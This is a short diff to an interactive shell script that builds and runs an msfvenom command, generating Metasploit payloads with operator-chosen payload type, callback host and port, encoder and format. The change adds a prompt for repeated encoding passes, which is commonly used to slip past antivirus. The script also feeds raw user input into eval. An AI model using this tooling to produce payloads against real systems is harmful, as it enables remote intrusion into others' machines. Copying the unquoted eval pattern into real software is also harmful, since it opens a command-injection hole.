@@ -54,7 +54,11 @@ case $e in
     3) echo ""
 esac
 
-#5.Formats
+#5.Encoding Times
+echo ""
+read -p "Input your encodeing times: " times
+
+#6.Formats
 echo ""
 echo "1) $formats1"
 echo "2) $formats2"
@@ -71,8 +75,8 @@ case $f in
     *) formats="$formats1"
 esac
 
-#6.Filename
+#7.Filename
 echo ""
 read -p "Input your filename: " name
 
-eval "msfvenom -p $payload LHOST=$lhost LPORT=$lport $encoder -f $formats > name"
+eval "msfvenom -p $payload LHOST=$lhost LPORT=$lport $encoder -i $times -f $formats > $name"
